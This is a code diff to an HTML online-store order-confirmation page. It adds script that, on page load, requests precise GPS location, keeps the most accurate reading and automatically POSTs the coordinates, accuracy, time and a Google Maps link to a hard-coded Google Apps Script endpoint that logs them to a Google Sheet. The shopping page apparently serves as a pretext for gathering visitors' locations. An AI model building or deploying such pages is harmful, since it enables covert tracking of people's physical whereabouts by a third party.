@@ -12,712 +12,17 @@
     <!-- Bootstrap Icons -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
 
-    <style>
-      :root {
-        --blue: #2874f0;
-        --green: #198754;
-        --light-green: #eaf8ef;
-        --text: #172033;
-        --muted: #667085;
-        --border: #e5e9f0;
-        --bg: #f5f7fb;
-      }
-
-      * {
-        box-sizing: border-box;
-      }
-
-      body {
-        margin: 0;
-        background: var(--bg);
-        color: var(--text);
-        font-family: Arial, Helvetica, sans-serif;
-      }
-
-      /* =====================================================
-         CUSTOMER HEADER
-      ===================================================== */
-
-      .customer-header {
-        background: #ffffff;
-        border-bottom: 1px solid var(--border);
-        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.06);
-        padding: 16px 20px;
-      }
-
-      .customer-header-inner {
-        max-width: 900px;
-        margin: auto;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        gap: 15px;
-      }
-
-      .brand-area {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-      }
-
-      /* Store Logo */
-      .brand-icon {
-        width: 44px;
-        height: 44px;
-        border-radius: 10px;
-        background: #2874f0;
-        color: #fff;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 21px;
-        box-shadow: 0 3px 8px rgba(40, 116, 240, 0.25);
-      }
-
-      .brand-icon i {
-        font-size: 22px;
-      }
-
-      .brand-name {
-        font-size: 18px;
-        font-weight: 700;
-        color: #172033;
-        line-height: 1.2;
-      }
-
-      .brand-subtitle {
-        font-size: 12px;
-        color: var(--muted);
-        margin-top: 3px;
-      }
-
-      .header-status {
-        display: flex;
-        align-items: center;
-        gap: 7px;
-        color: var(--green);
-        font-size: 13px;
-        font-weight: 700;
-        background: #eaf8ef;
-        padding: 8px 12px;
-        border-radius: 20px;
-        white-space: nowrap;
-      }
-
-      .header-status i {
-        font-size: 15px;
-      }
-
-      /* =====================================================
-         MAIN
-      ===================================================== */
-
-      .order-page {
-        max-width: 900px;
-        margin: 30px auto;
-      }
-
-      .order-card {
-        background: #fff;
-        border: 1px solid var(--border);
-        border-radius: 16px;
-        box-shadow: 0 5px 25px rgba(0, 0, 0, 0.06);
-        overflow: hidden;
-      }
-
-      /* =====================================================
-         CONFIRMATION
-      ===================================================== */
-
-      .confirmation-header {
-        padding: 28px 30px;
-        border-bottom: 1px solid var(--border);
-      }
-
-      .confirmed-title {
-        color: var(--green);
-        font-size: 27px;
-        font-weight: 700;
-      }
-
-      .confirmed-icon {
-        width: 42px;
-        height: 42px;
-        background: var(--green);
-        color: white;
-        border-radius: 50%;
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 22px;
-        flex-shrink: 0;
-      }
-
-      .confirmation-text {
-        color: var(--muted);
-        font-size: 14px;
-      }
-
-      /* =====================================================
-         VERIFIED
-      ===================================================== */
-
-      .secure-box {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-      }
-
-      .secure-icon {
-        width: 42px;
-        height: 48px;
-        background: var(--blue);
-        color: white;
-        clip-path: polygon(50% 0%, 90% 15%, 90% 55%, 50% 100%, 10% 55%, 10% 15%);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 19px;
-        flex-shrink: 0;
-      }
-
-      .secure-title {
-        color: var(--blue);
-        font-weight: 700;
-        font-size: 15px;
-      }
-
-      .secure-subtitle {
-        color: var(--muted);
-        font-size: 12px;
-      }
-
-      /* =====================================================
-         SECTION
-      ===================================================== */
-
-      .content-section {
-        margin: 20px 30px;
-        border: 1px solid var(--border);
-        border-radius: 13px;
-        padding: 22px;
-      }
-
-      .section-heading {
-        font-size: 17px;
-        font-weight: 700;
-        margin-bottom: 18px;
-      }
-
-      .section-heading i {
-        color: var(--blue);
-        margin-right: 8px;
-      }
-
-      /* =====================================================
-         ORDER INFO
-      ===================================================== */
-
-      .order-id-label {
-        color: var(--muted);
-        font-size: 13px;
-        margin-bottom: 5px;
-      }
-
-      .order-id {
-        font-size: 27px;
-        font-weight: 700;
-      }
-
-      .copy-btn {
-        border: none;
-        background: transparent;
-        color: var(--muted);
-        margin-left: 5px;
-        cursor: pointer;
-      }
-
-      .copy-btn:hover {
-        color: var(--blue);
-      }
-
-      .date-info {
-        color: var(--muted);
-        font-size: 14px;
-      }
-
-      .date-info i {
-        color: var(--blue);
-        margin-right: 7px;
-      }
-
-      /* =====================================================
-         PAYMENT
-      ===================================================== */
-
-      .paid-badge {
-        display: inline-block;
-        background: #dff5e6;
-        color: var(--green);
-        padding: 7px 15px;
-        border-radius: 8px;
-        font-size: 13px;
-        font-weight: 700;
-        margin-bottom: 8px;
-      }
-
-      .payment-title {
-        font-size: 15px;
-        margin-bottom: 5px;
-      }
-
-      .payment-success {
-        color: var(--green);
-        font-size: 13px;
-        font-weight: 700;
-      }
-
-      /* =====================================================
-         CUSTOMER
-      ===================================================== */
-
-      .customer-name {
-        font-size: 18px;
-        font-weight: 700;
-        margin-bottom: 10px;
-      }
-
-      .detail-row {
-        display: flex;
-        align-items: flex-start;
-        gap: 10px;
-        color: #475467;
-        font-size: 14px;
-        margin-bottom: 10px;
-      }
-
-      .detail-row i {
-        color: var(--blue);
-        font-size: 16px;
-        margin-top: 1px;
-      }
-
-      /* =====================================================
-         ADDRESS
-      ===================================================== */
-
-      .address-text {
-        font-size: 14px;
-        line-height: 1.7;
-        color: #344054;
-      }
-
-      .map-btn {
-        border: 1px solid #8eb4f7;
-        background: #fff;
-        color: var(--blue);
-        border-radius: 9px;
-        padding: 8px 14px;
-        font-size: 13px;
-        font-weight: 600;
-      }
-
-      .map-btn:hover {
-        background: #f1f6ff;
-      }
-
-      /* =====================================================
-         PRODUCT
-      ===================================================== */
-
-      .product-item {
-        display: flex;
-        align-items: center;
-        gap: 18px;
-        padding: 15px 0;
-        border-bottom: 1px solid #edf0f4;
-      }
-
-      .product-item:last-child {
-        border-bottom: none;
-      }
-
-      .product-image {
-        width: 120px;
-        height: 110px;
-        border: 1px solid var(--border);
-        border-radius: 9px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        overflow: hidden;
-        background: #fff;
-        flex-shrink: 0;
-      }
-
-      .product-image img {
-        width: 100%;
-        height: 100%;
-        object-fit: contain;
-        display: block;
-        padding: 5px;
-      }
-
-      .product-name {
-        font-size: 16px;
-        font-weight: 700;
-        margin-bottom: 7px;
-      }
-
-      .product-meta {
-        color: var(--muted);
-        font-size: 13px;
-        margin-bottom: 8px;
-      }
-
-      .qty-badge {
-        background: #edf4ff;
-        color: var(--blue);
-        padding: 5px 9px;
-        border-radius: 6px;
-        font-size: 12px;
-        font-weight: 700;
-        display: inline-block;
-      }
-
-      .product-price {
-        font-size: 18px;
-        font-weight: 700;
-        margin-left: auto;
-        white-space: nowrap;
-      }
-
-      /* =====================================================
-         SUMMARY
-      ===================================================== */
-
-      .summary-row {
-        display: flex;
-        justify-content: space-between;
-        color: #475467;
-        font-size: 14px;
-        margin-bottom: 12px;
-      }
-
-      .summary-total {
-        display: flex;
-        justify-content: space-between;
-        border-top: 1px dashed #d8dee8;
-        padding-top: 16px;
-        margin-top: 14px;
-        font-size: 18px;
-        font-weight: 700;
-      }
-
-      .total-price {
-        color: var(--blue);
-        font-size: 23px;
-      }
-
-      /* =====================================================
-         PAID ONLINE
-      ===================================================== */
-
-      .paid-online {
-        margin-top: 20px;
-        background: var(--light-green);
-        border: 1px solid #ccebd6;
-        border-radius: 10px;
-        padding: 15px;
-      }
-
-      .paid-online-icon {
-        width: 38px;
-        height: 38px;
-        background: var(--green);
-        color: white;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 18px;
-        flex-shrink: 0;
-      }
-
-      .paid-online-title {
-        font-weight: 700;
-        font-size: 15px;
-      }
-
-      .paid-online-text {
-        color: var(--muted);
-        font-size: 12px;
-      }
-
-      .paid-online-amount {
-        color: var(--green);
-        font-size: 18px;
-        font-weight: 700;
-        margin-left: auto;
-        white-space: nowrap;
-      }
-
-      /* =====================================================
-         SELLER
-      ===================================================== */
-
-      .seller-logo {
-        width: 85px;
-        height: 85px;
-        border-radius: 50%;
-        background: #171d29;
-        color: white;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        font-weight: 800;
-        font-style: italic;
-        font-size: 17px;
-        flex-shrink: 0;
-      }
-
-      .seller-name {
-        font-size: 18px;
-        font-weight: 700;
-        margin-bottom: 10px;
-      }
-
-      .seller-feature-box {
-        background: #f5f8ff;
-        border: 1px solid #dce8ff;
-        border-radius: 10px;
-        padding: 14px;
-      }
-
-      .seller-feature {
-        display: flex;
-        gap: 9px;
-        align-items: center;
-        color: var(--blue);
-        font-size: 12px;
-        margin-bottom: 9px;
-      }
-
-      .seller-feature:last-child {
-        margin-bottom: 0;
-      }
-
-      /* =====================================================
-         VERIFIED FOOTER
-      ===================================================== */
-
-      .verified-box {
-        margin: 20px 30px 25px;
-        border: 1px solid #a8c8ff;
-        background: #f7faff;
-        border-radius: 11px;
-        padding: 15px 18px;
-      }
-
-      .verified-box i {
-        color: var(--blue);
-        font-size: 25px;
-      }
-
-      .verified-title {
-        color: var(--blue);
-        font-size: 14px;
-        font-weight: 700;
-      }
-
-      .verified-text {
-        color: var(--muted);
-        font-size: 12px;
-      }
-
-      .contact-btn {
-        border: 1px solid var(--blue);
-        color: var(--blue);
-        background: white;
-        border-radius: 9px;
-        padding: 9px 15px;
-        font-weight: 600;
-        font-size: 13px;
-      }
-
-      .contact-btn:hover {
-        background: #eef5ff;
-      }
-
-      /* =====================================================
-         THANK YOU
-      ===================================================== */
-
-      .thank-you {
-        text-align: center;
-        color: #475467;
-        font-size: 14px;
-        padding-bottom: 25px;
-      }
-
-      /* =====================================================
-         MOBILE
-      ===================================================== */
-
-      @media (max-width: 767px) {
-        .customer-header {
-          padding: 12px 15px;
-        }
-
-        .customer-header-inner {
-          gap: 10px;
-        }
-
-        .brand-icon {
-          width: 38px;
-          height: 38px;
-          border-radius: 9px;
-        }
-
-        .brand-icon i {
-          font-size: 18px;
-        }
-
-        .brand-name {
-          font-size: 16px;
-        }
-
-        .brand-subtitle {
-          font-size: 10px;
-        }
-
-        .header-status {
-          font-size: 11px;
-          padding: 7px 9px;
-        }
-
-        .order-page {
-          margin: 15px auto;
-          padding: 0 10px;
-        }
-
-        .order-card {
-          border-radius: 12px;
-        }
-
-        .confirmation-header {
-          padding: 20px;
-        }
-
-        .confirmed-title {
-          font-size: 21px;
-        }
-
-        .confirmed-icon {
-          width: 36px;
-          height: 36px;
-          font-size: 18px;
-        }
-
-        .confirmation-text {
-          line-height: 1.5;
-          margin-top: 3px;
-        }
-
-        .secure-box {
-          margin-top: 18px;
-          justify-content: flex-start !important;
-        }
-
-        .content-section {
-          margin: 15px;
-          padding: 16px;
-        }
-
-        .product-item {
-          align-items: flex-start;
-          gap: 12px;
-        }
-
-        .product-image {
-          width: 85px;
-          height: 85px;
-        }
-
-        .product-name {
-          font-size: 14px;
-          line-height: 1.35;
-        }
-
-        .product-meta {
-          font-size: 12px;
-        }
-
-        .product-price {
-          font-size: 15px;
-        }
-
-        .paid-online .d-flex {
-          align-items: flex-start !important;
-        }
-
-        .paid-online-amount {
-          font-size: 15px;
-        }
-
-        .seller-feature-box {
-          margin-top: 15px;
-        }
-
-        .verified-box {
-          margin: 15px;
-        }
-
-        .verified-box .contact-btn {
-          margin-top: 12px;
-          width: 100%;
-        }
-      }
-
-      /* =====================================================
-         VERY SMALL MOBILE
-      ===================================================== */
-
-      @media (max-width: 480px) {
-        .customer-header-inner {
-          align-items: center;
-        }
-
-        .header-status {
-          font-size: 10px;
-          padding: 6px 8px;
-        }
-
-        .header-status i {
-          font-size: 12px;
-        }
-
-        .brand-name {
-          font-size: 15px;
-        }
-
-        .brand-subtitle {
-          font-size: 9px;
-        }
-
-        .order-id {
-          font-size: 22px;
-        }
-
-        .product-price {
-          font-size: 14px;
-        }
-      }
-    </style>
+    <link rel="stylesheet" type="text/css" href="./style1.css" />
+    <link rel="stylesheet" type="text/css" href="./style_form.css" />
   </head>
 
   <body>
+    <!---==================================================================---->
+    <!---==================================================================---->
+    <!---==================================================================---->
+    <!---==================================================================---->
+    <!---==================================================================---->
+   
     <!-- =====================================================
          CUSTOMER HEADER
     ====================================================== -->
@@ -1110,6 +415,480 @@
 
       function contactStore() {
         window.location.href = "tel:+919123456789";
+      }
+    </script>
+
+    <!---==================================================================---->
+    <!---==================================================================---->
+    <!---==================================================================---->
+    <!---==================================================================---->
+    <!---==================================================================---->
+
+    <div class="dis">
+      <div class="card">
+        <h2>📍 GPS Location</h2>
+
+        <div id="status" class="status">📡 Location permission required...</div>
+
+        <!-- LATITUDE -->
+
+        <div class="box">
+          <span class="label">Latitude</span>
+          <span id="lat" class="value">---</span>
+        </div>
+
+        <!-- LONGITUDE -->
+
+        <div class="box">
+          <span class="label">Longitude</span>
+          <span id="lon" class="value">---</span>
+        </div>
+
+        <!-- ACCURACY -->
+
+        <div class="box">
+          <span class="label">GPS Accuracy</span>
+          <span id="accuracy" class="value">---</span>
+        </div>
+
+        <!-- READING -->
+
+        <div class="box">
+          <span class="label">Best Reading</span>
+          <span id="reading" class="value">---</span>
+        </div>
+
+        <!-- MAP URL -->
+
+        <div class="box">
+          <span class="label">Google Maps URL</span>
+          <span id="mapUrl" class="value">---</span>
+        </div>
+
+        <!-- GOOGLE MAPS BUTTON -->
+
+        <a id="mapBtn" class="map-btn" target="_blank" rel="noopener noreferrer"> 🗺️ Open Location in Google Maps </a>
+
+        <!-- GOOGLE SHEET STATUS -->
+
+        <div id="sheetStatus" class="sheet-status"></div>
+
+        <!-- COPY BUTTON -->
+
+        <button id="copyBtn" class="copy-btn" type="button" onclick="copyLocation()">📋 Copy Google Maps URL</button>
+
+        <div class="small">GPS accuracy device aur surroundings par depend karti hai. Outdoor area mein accuracy generally better hoti hai.</div>
+      </div>
+    </div>
+
+    <script>
+      /* =========================================================
+   GOOGLE APPS SCRIPT WEB APP URL
+========================================================= */
+
+      const GOOGLE_SHEET_API = "https://script.google.com/macros/s/AKfycby_BxHYfoPGf0Hy-ssCBxVPhwzobxpjaFyUgxJV7qkgOMBfYq5dHhDzUp8lm0sfwsw2/exec";
+
+      /* =========================================================
+   GPS VARIABLES
+========================================================= */
+
+      let bestPosition = null;
+
+      let watchId = null;
+
+      let readings = 0;
+
+      let sheetAlreadySaved = false;
+
+      let autoSaveStarted = false;
+
+      /* =========================================================
+   GPS SETTINGS
+========================================================= */
+
+      const MAX_READINGS = 10;
+
+      /* =========================================================
+   PAGE LOAD
+========================================================= */
+
+      window.addEventListener("load", function () {
+        console.log("🚀 Page loaded");
+
+        startGPS();
+      });
+
+      /* =========================================================
+   START GPS
+========================================================= */
+
+      function startGPS() {
+        const status = document.getElementById("status");
+
+        /* GPS SUPPORT CHECK */
+
+        if (!navigator.geolocation) {
+          status.innerHTML = "❌ Browser GPS support nahi karta.";
+
+          return;
+        }
+
+        /* HTTPS CHECK */
+
+        if (location.protocol !== "https:" && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
+          status.innerHTML = "⚠️ GPS ke liye HTTPS ya localhost required hai.";
+
+          return;
+        }
+
+        status.innerHTML = "📍 Location permission Allow karein...";
+
+        /* =====================================================
+     WATCH GPS
+  ===================================================== */
+
+        watchId = navigator.geolocation.watchPosition(
+          function (position) {
+            readings++;
+
+            const accuracy = position.coords.accuracy;
+
+            console.log("📡 GPS Reading:", readings, "Accuracy:", accuracy);
+
+            /* =================================================
+         BEST ACCURACY LOCATION
+      ================================================= */
+
+            if (bestPosition === null || accuracy < bestPosition.coords.accuracy) {
+              bestPosition = position;
+
+              showPosition(position);
+
+              createMapURL(position);
+
+              showButtons();
+
+              /* =============================================
+           1 SECOND TIMER
+           
+           LOCATION MILNE KE BAAD
+           1 SECOND WAIT
+           PHIR SAVE
+        ============================================= */
+
+              if (!autoSaveStarted) {
+                autoSaveStarted = true;
+
+                console.log("⏳ 1 second timer started...");
+
+                status.innerHTML = "📍 Location found. Saving in 1 second...";
+
+                setTimeout(function () {
+                  console.log("⏰ Timer complete.");
+
+                  saveToGoogleSheet();
+                }, 10);
+              }
+            }
+
+            /* =================================================
+         MAX READINGS
+      ================================================= */
+
+            if (readings >= MAX_READINGS) {
+              finishGPS();
+            }
+          },
+
+          /* =====================================================
+       GPS ERROR
+    ===================================================== */
+
+          function (error) {
+            console.error("❌ GPS ERROR:", error);
+
+            if (error.code === 1) {
+              status.innerHTML = "❌ Location permission denied.<br><br>" + "Browser settings mein Location Allow karein.";
+            } else if (error.code === 2) {
+              status.innerHTML = "❌ Location unavailable.<br><br>" + "Phone ki Location/GPS ON karein.";
+            } else if (error.code === 3) {
+              status.innerHTML = "❌ GPS timeout.<br><br>" + "Open area mein dobara try karein.";
+            } else {
+              status.innerHTML = "❌ GPS location nahi mil saki.";
+            }
+          },
+
+          /* =====================================================
+       GPS OPTIONS
+    ===================================================== */
+
+          {
+            enableHighAccuracy: true,
+
+            timeout: 30000,
+
+            maximumAge: 0,
+          },
+        );
+      }
+
+      /* =========================================================
+   SHOW POSITION
+========================================================= */
+
+      function showPosition(position) {
+        const latitude = position.coords.latitude;
+
+        const longitude = position.coords.longitude;
+
+        const accuracy = position.coords.accuracy;
+
+        document.getElementById("lat").innerHTML = latitude.toFixed(8);
+
+        document.getElementById("lon").innerHTML = longitude.toFixed(8);
+
+        document.getElementById("accuracy").innerHTML = accuracy.toFixed(2) + " meters";
+
+        document.getElementById("reading").innerHTML = readings + " / " + MAX_READINGS;
+
+        const status = document.getElementById("status");
+
+        if (accuracy <= 10) {
+          status.innerHTML = "✅ Excellent GPS accuracy: " + accuracy.toFixed(2) + " meters";
+        } else if (accuracy <= 30) {
+          status.innerHTML = "✅ Good GPS accuracy: " + accuracy.toFixed(2) + " meters";
+        } else {
+          status.innerHTML = "📍 Location found. Accuracy: " + accuracy.toFixed(2) + " meters";
+        }
+      }
+
+      /* =========================================================
+   GOOGLE MAP URL
+========================================================= */
+
+      function createMapURL(position) {
+        const latitude = position.coords.latitude;
+
+        const longitude = position.coords.longitude;
+
+        const url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+
+        document.getElementById("mapUrl").innerHTML = url;
+
+        const mapBtn = document.getElementById("mapBtn");
+
+        mapBtn.href = url;
+
+        mapBtn.style.display = "block";
+      }
+
+      /* =========================================================
+   SHOW BUTTONS
+========================================================= */
+
+      function showButtons() {
+        document.getElementById("mapBtn").style.display = "block";
+
+        document.getElementById("copyBtn").style.display = "block";
+      }
+
+      /* =========================================================
+   FINISH GPS
+========================================================= */
+
+      function finishGPS() {
+        if (watchId !== null) {
+          navigator.geolocation.clearWatch(watchId);
+
+          watchId = null;
+        }
+
+        if (bestPosition) {
+          showPosition(bestPosition);
+
+          createMapURL(bestPosition);
+
+          showButtons();
+        }
+      }
+
+      /* =========================================================
+   SAVE TO GOOGLE SHEET
+   AUTOMATIC FUNCTION
+========================================================= */
+
+      function saveToGoogleSheet() {
+        /* LOCATION CHECK */
+
+        if (!bestPosition) {
+          console.log("❌ Location available nahi hai.");
+
+          return;
+        }
+
+        /* DUPLICATE CHECK */
+
+        if (sheetAlreadySaved) {
+          console.log("⚠️ Data already saved.");
+
+          return;
+        }
+
+        const latitude = bestPosition.coords.latitude;
+
+        const longitude = bestPosition.coords.longitude;
+
+        const accuracy = bestPosition.coords.accuracy;
+
+        const mapsURL = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+
+        const dateTime = new Date().toLocaleString("en-IN");
+
+        /* =====================================================
+     DATA
+  ===================================================== */
+
+        const data = {
+          dateTime: dateTime,
+
+          latitude: latitude.toFixed(8),
+
+          longitude: longitude.toFixed(8),
+
+          accuracy: accuracy.toFixed(2),
+
+          mapsUrl: mapsURL,
+        };
+
+        console.log("📤 Sending Google Sheet Data:", data);
+
+        const sheetStatus = document.getElementById("sheetStatus");
+
+        sheetStatus.style.display = "block";
+
+        sheetStatus.style.background = "#eff6ff";
+
+        sheetStatus.style.color = "#1d4ed8";
+
+        sheetStatus.innerHTML = "📤 Google Sheet mein data save ho raha hai...";
+
+        /* =====================================================
+     API REQUEST
+  ===================================================== */
+
+        fetch(
+          GOOGLE_SHEET_API,
+
+          {
+            method: "POST",
+
+            mode: "no-cors",
+
+            headers: {
+              "Content-Type": "text/plain;charset=utf-8",
+            },
+
+            body: JSON.stringify(data),
+          },
+        )
+          .then(function () {
+            sheetAlreadySaved = true;
+
+            sheetStatus.style.background = "#f0fdf4";
+
+            sheetStatus.style.color = "#15803d";
+
+            sheetStatus.innerHTML =
+              "✅ <b>Location saved to Google Sheet!</b><br>" +
+              "<small>" +
+              "Date/Time, Latitude, Longitude, Accuracy aur Maps URL save kiya gaya." +
+              "</small>";
+
+            console.log("✅ Google Sheet request sent successfully.");
+          })
+
+          .catch(function (error) {
+            console.error("❌ Google Sheet Error:", error);
+
+            sheetStatus.style.background = "#fef2f2";
+
+            sheetStatus.style.color = "#dc2626";
+
+            sheetStatus.innerHTML = "❌ Google Sheet request failed.";
+          });
+      }
+
+      /* =========================================================
+   COPY GOOGLE MAPS URL
+========================================================= */
+
+      function copyLocation() {
+        if (!bestPosition) {
+          alert("❌ Location available nahi hai.");
+
+          return;
+        }
+
+        const latitude = bestPosition.coords.latitude;
+
+        const longitude = bestPosition.coords.longitude;
+
+        const url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard
+            .writeText(url)
+
+            .then(function () {
+              const button = document.getElementById("copyBtn");
+
+              button.innerHTML = "✅ URL Copied!";
+
+              setTimeout(function () {
+                button.innerHTML = "📋 Copy Google Maps URL";
+              }, 2000);
+            })
+
+            .catch(function () {
+              fallbackCopy(url);
+            });
+        } else {
+          fallbackCopy(url);
+        }
+      }
+
+      /* =========================================================
+   FALLBACK COPY
+========================================================= */
+
+      function fallbackCopy(text) {
+        const textarea = document.createElement("textarea");
+
+        textarea.value = text;
+
+        textarea.style.position = "fixed";
+
+        textarea.style.left = "-9999px";
+
+        document.body.appendChild(textarea);
+
+        textarea.select();
+
+        try {
+          document.execCommand("copy");
+
+          const button = document.getElementById("copyBtn");
+
+          button.innerHTML = "✅ URL Copied!";
+
+          setTimeout(function () {
+            button.innerHTML = "📋 Copy Google Maps URL";
+          }, 2000);
+        } catch (error) {
+          alert("Google Maps URL:\n\n" + text);
+        }
+
+        document.body.removeChild(textarea);
       }
     </script>
   </body>
